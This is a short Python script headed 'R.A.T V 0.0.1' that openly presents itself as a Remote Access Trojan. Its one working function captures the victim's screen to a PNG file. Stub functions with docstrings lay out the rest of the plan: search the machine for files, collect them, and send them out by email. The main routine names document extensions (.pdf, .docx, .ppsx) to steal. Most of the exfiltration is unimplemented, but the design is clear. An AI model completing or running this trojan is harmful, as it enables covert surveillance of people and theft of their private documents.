#!/usr/bin/python
#
# R.A.T V 0.0.1
#

from twisted import mail
import ImageGrab
import os
import time

def screenGrab():
    box = ()
    im = ImageGrab.grab()
    im.save(os.getcwd() + '\\full_snap__' + str(int(time.time())) +
'.png', 'PNG')

def search_for_files():
	"""
	search for files in the current dirctory.
	"""
	pass

def collect_files():
	"""
	parse and save all files returned by search_for_files.
	"""
	pass

def send_filesvia_email():
	"""
	send all files returned by collect_files to the specified email.
	"""
	pass

def main():
	print "Remote Access Trojan V 0.0.1\n"
	screenGrab()
	file_extensions = ['.pdf','.docx','.xlfs','.ppsx'] #file extensions to be searched for and uploaded.

if __name__ == '__main__':
    main()
